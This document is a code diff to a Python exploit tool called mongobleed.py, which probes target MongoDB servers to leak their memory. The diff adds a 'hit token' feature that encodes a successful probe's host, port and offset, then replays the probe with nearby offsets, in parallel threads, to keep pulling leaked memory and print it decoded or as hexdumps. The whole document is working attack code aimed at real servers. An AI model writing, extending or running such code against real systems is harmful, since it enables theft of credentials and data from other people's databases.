@@ -15,6 +15,7 @@ import base64
 import codecs
 import concurrent.futures
 import datetime
+import json
 import os
 import re
 import socket
@@ -185,6 +186,8 @@ def main():
         "  python3 mongobleed.py --host <target> --auto --auto-mode size\n"
         "  python3 mongobleed.py --host <target> --auto --auto-legacy\n"
         "  python3 mongobleed.py --host <target> --optimize --loop --decode\n"
+        "  python3 mongobleed.py --hit <token>\n"
+        "  python3 mongobleed.py --hit <token> --hit-wiggle 32 --loop\n"
         "  python3 mongobleed.py --host <target> --dump 10MB\n"
         "  python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048\n"
         "  python3 mongobleed.py --host <target> --dump 512KB --preview-bytes 4096 --decode\n"
@@ -217,6 +220,9 @@ def main():
     parser.add_argument('--loop', action='store_true', help='Keep looping until stopped')
     parser.add_argument('--decode', action='store_true', help='Try to decode URL, unicode escapes, and base64')
     parser.add_argument('--hex', action='store_true', help='Force hexdump preview output')
+    parser.add_argument('--hit', help='Replay a specific hit token from output')
+    parser.add_argument('--hit-wiggle', type=int, default=0,
+                        help='Probe +/- N bytes around hit offset when replaying')
     parser.add_argument('--dump', help='Target claimed size, e.g. 10MB or 512KB')
     parser.add_argument('--dump-window', type=int, default=0, help='Probe +/- N bytes around dump size (0=auto)')
     parser.add_argument('--auto', action='store_true', help='Auto-tune dump size/window for best yield')
@@ -390,6 +396,25 @@ def main():
             return amount * 1024 * 1024
         return amount
 
+    def encode_hit_token(doc_len):
+        payload = {
+            "doc_len": doc_len,
+            "buffer_extra": args.buffer_extra,
+            "timeout": args.timeout,
+            "preview_bytes": args.preview_bytes,
+            "host": args.host,
+            "port": args.port,
+            "decode": args.decode,
+            "hex": args.hex,
+        }
+        raw = json.dumps(payload, separators=(",", ":")).encode("utf-8")
+        return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")
+
+    def decode_hit_token(token):
+        pad = "=" * (-len(token) % 4)
+        raw = base64.urlsafe_b64decode(token + pad)
+        return json.loads(raw.decode("utf-8"))
+
     def auto_window_for_size(size):
         return max(1024, min(65536, size // 2048))
 
@@ -510,6 +535,86 @@ def main():
     except ValueError as exc:
         console.print(f"[bold red][!][/bold red] {exc}")
         return
+
+    if args.hit:
+        try:
+            hit = decode_hit_token(args.hit)
+        except Exception:
+            console.print("[bold red][!][/bold red] Invalid hit token.")
+            return
+        args.host = hit.get("host", args.host)
+        args.port = int(hit.get("port", args.port))
+        args.buffer_extra = int(hit.get("buffer_extra", args.buffer_extra))
+        args.timeout = float(hit.get("timeout", args.timeout))
+        args.preview_bytes = int(hit.get("preview_bytes", args.preview_bytes))
+        args.decode = bool(hit.get("decode", args.decode))
+        args.hex = bool(hit.get("hex", args.hex))
+        doc_len = int(hit.get("doc_len", 0))
+        if doc_len <= 0:
+            console.print("[bold red][!][/bold red] Hit token missing doc_len.")
+            return
+        base = doc_len
+        offsets = [base]
+        if args.hit_wiggle > 0:
+            offsets = list(range(base - args.hit_wiggle, base + args.hit_wiggle + 1))
+        try:
+            while True:
+                any_leaks = False
+                valid_offsets = [o for o in offsets if o > 0]
+                total_offsets = len(valid_offsets)
+                with Progress(
+                    SpinnerColumn(),
+                    TextColumn(f"[bold cyan]Hit replay[/bold cyan] (workers={args.workers})"),
+                    BarColumn(),
+                    TextColumn("{task.completed}/{task.total}"),
+                    TextColumn("last={task.fields[last]:>7}"),
+                    TimeElapsedColumn(),
+                    console=console,
+                ) as progress:
+                    task_id = progress.add_task("hit", total=total_offsets, last="-")
+                    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
+                        futures = {
+                            executor.submit(
+                                send_probe,
+                                args.host,
+                                args.port,
+                                off,
+                                off + args.buffer_extra,
+                                args.timeout,
+                            ): off
+                            for off in valid_offsets
+                        }
+                        for future in concurrent.futures.as_completed(futures):
+                            off = futures[future]
+                            response = future.result()
+                            leaks = extract_leaks(response)
+                            progress.update(task_id, advance=1, last=str(off))
+                            if leaks:
+                                any_leaks = True
+                            for data in leaks:
+                                preview = ascii_preview(data, args.preview_bytes)
+                                if args.decode:
+                                    variants = decode_variants(data, args.preview_bytes * 2)
+                                    if variants:
+                                        preview = " | ".join(variants)
+                                    else:
+                                        cleaned = decode_from_preview(preview, args.preview_bytes * 2)
+                                        if cleaned:
+                                            preview = cleaned
+                                if (args.decode and not is_mostly_printable(preview)) or args.hex:
+                                    hexdump = hexdump_preview(data, args.preview_bytes)
+                                    console.print(f"[green][+][/green] hit offset={off} len={len(data):4d}:\n{hexdump}")
+                                else:
+                                    console.print(f"[green][+][/green] hit offset={off} len={len(data):4d}: {preview}")
+                if not any_leaks:
+                    console.print("[bold yellow][!][/bold yellow] No leaks for hit token.")
+                    if not args.loop:
+                        return
+                if not args.loop:
+                    return
+        except KeyboardInterrupt:
+            console.print("[bold yellow][!][/bold yellow] Ctrl+C detected, stopping hit replay.")
+            return
 
     if args.auto:
         try:
@@ -869,13 +974,15 @@ def main():
                                             cleaned = decode_from_preview(preview, args.preview_bytes * 2)
                                             if cleaned:
                                                 preview = cleaned
-                                    if (args.decode and not is_mostly_printable(preview)) or args.hex:
-                                        hexdump = hexdump_preview(data, args.preview_bytes)
-                                        console.print(
-                                            f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}:\n{hexdump}"
-                                        )
-                                    else:
-                                        console.print(f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}: {preview}")
+                                if (args.decode and not is_mostly_printable(preview)) or args.hex:
+                                    hexdump = hexdump_preview(data, args.preview_bytes)
+                                    console.print(
+                                        f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}:\n{hexdump}"
+                                    )
+                                else:
+                                    console.print(f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}: {preview}")
+                                hit_token = encode_hit_token(doc_len)
+                                console.print(f"[dim]hit={hit_token}[/dim]")
             if args.loop:
                 if auto_context is not None and not args.optimize:
                     if new_in_pass == 0:
